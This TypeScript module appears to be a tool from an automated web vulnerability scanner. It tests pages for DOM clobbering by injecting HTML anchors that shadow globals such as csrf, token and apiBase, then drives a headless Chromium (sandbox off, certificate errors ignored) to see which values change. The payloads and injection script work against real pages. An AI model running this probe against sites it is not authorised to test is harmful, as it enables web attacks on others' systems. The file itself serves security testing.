// T57 — dom_clobber_probe
// HTML injection that overrides global JS variables via id/name attributes.
// Drives browser_session to confirm clobber-induced behaviour change.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const BROWSER_SESSION_URL = 'http://chromium_renderer:3301';

const definition: ToolDefinition = {
  name: 'dom_clobber_probe',
  description:
    'Test for DOM clobbering vulnerabilities. Injects HTML that shadows global JS variables ' +
    'via id= / name= attributes, then drives browser_session to observe whether JS behaviour ' +
    'changes. Detects cases where page reads config.apiBase or window.csrf from globals that ' +
    'can be overwritten by injected HTML.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'url',              type: 'string', required: true,  description: 'Target page URL' },
    { name: 'inject_field',     type: 'string', required: false, description: 'URL parameter or form field for HTML injection', default: 'q' },
    { name: 'clobber_targets',  type: 'string', required: false, description: 'JSON array of global names to try to shadow', default: '["config","settings","csrf","token","apiBase","nonce"]' },
    { name: 'auth_cookie',      type: 'string', required: false, description: 'Auth cookie string' },
    { name: 'timeout_ms',       type: 'number', required: false, description: 'Per-test timeout ms', default: 30000 },
  ],
};

export const domClobberProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    const url = String(params.url || '');
    const injectField = String(params.inject_field || 'q');
    const authCookie = params.auth_cookie ? String(params.auth_cookie) : undefined;
    const timeoutMs = Number(params.timeout_ms || 30000);

    if (!url) return { output: 'url required', parsed: { error: 'missing_url' } };

    let clobberTargets: string[] = ['config', 'settings', 'csrf', 'token', 'apiBase', 'nonce'];
    try { if (params.clobber_targets) clobberTargets = JSON.parse(String(params.clobber_targets)); } catch { /* ignore */ }

    const clobberPayloads = clobberTargets.map(t => `<a id="${t}"></a><a id="${t}" name="apiBase" href="https://genesis-clobber.internal/clobbered"></a>`);

    const script = `
const { chromium } = require('playwright');
(async () => {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox', '--ignore-certificate-errors'] });
  const context = await browser.newContext({
    ${authCookie ? `extraHTTPHeaders: { 'Cookie': '${authCookie.replace(/'/g, "\\'")}' },` : ''}
    ignoreHTTPSErrors: true,
  });
  const page = await context.newPage();
  const results = [];
  const clobberTargets = ${JSON.stringify(clobberTargets)};

  // Baseline: capture global values
  await page.goto('${url.replace(/'/g, "\\'")}', { waitUntil: 'networkidle', timeout: 15000 }).catch(() => {});
  const baseline = await page.evaluate((targets) => {
    const vals = {};
    for (const t of targets) {
      try { vals[t] = typeof window[t] !== 'undefined' ? String(window[t]).substring(0, 50) : 'undefined'; } catch { vals[t] = 'error'; }
    }
    return vals;
  }, clobberTargets).catch(() => ({}));

  // Clobber attempt
  for (const target of clobberTargets) {
    const payload = '<a id="' + target + '"></a><a id="' + target + '" name="apiBase" href="https://genesis-clobber.internal/clobbered"></a>';
    const testUrl = '${url.replace(/'/g, "\\'")}' + ('${url.includes('?') ? '&' : '?'}') + '${injectField}=' + encodeURIComponent(payload);
    try {
      await page.goto(testUrl, { waitUntil: 'networkidle', timeout: 15000 }).catch(() => {});
      const clobbered = await page.evaluate((t) => {
        try { return typeof window[t] !== 'undefined' ? String(window[t]).substring(0, 100) : 'undefined'; } catch { return 'error'; }
      }, target).catch(() => 'eval_error');
      const interesting = clobbered.includes('genesis-clobber.internal') || (clobbered !== 'undefined' && clobbered !== baseline[target]);
      results.push({ target, baseline: baseline[target], clobbered, interesting });
    } catch (e) {
      results.push({ target, baseline: baseline[target], clobbered: 'error', interesting: false, error: e.message });
    }
  }
  await browser.close();
  console.log(JSON.stringify(results));
})().catch(e => { console.error(e.message); process.exit(1); });
`;

    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs + 10000);
      const resp = await fetch(`${BROWSER_SESSION_URL}/execute`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ script, timeout: timeoutMs }),
        signal: controller.signal,
      });
      clearTimeout(timer);

      const result = await resp.json() as { stdout?: string; stderr?: string };
      let probeResults: Array<{ target: string; baseline: string; clobbered: string; interesting: boolean; error?: string }> = [];
      try { probeResults = JSON.parse(result.stdout || '[]'); } catch { /* ignore */ }

      const interesting = probeResults.filter(r => r.interesting);
      const lines = [
        `dom_clobber_probe — ${clobberTargets.length} global targets on ${url.substring(0, 80)}`,
        `Clobber successes: ${interesting.length}/${probeResults.length}`,
        '─'.repeat(72),
      ];
      for (const r of probeResults) {
        const flag = r.interesting ? '⚡ CLOBBERED' : '  ·        ';
        lines.push(`  ${flag}  [${r.target.padEnd(16)}]  baseline="${r.baseline?.substring(0, 30) || 'n/a'}"  clobbered="${r.clobbered?.substring(0, 40) || 'n/a'}"`);
      }

      return {
        output: lines.join('\n'),
        parsed: { total: probeResults.length, interesting_count: interesting.length, interesting, results: probeResults },
      };
    } catch (err) {
      return { output: `browser_session error: ${String(err)}`, parsed: { error: String(err) } };
    }
  },
};
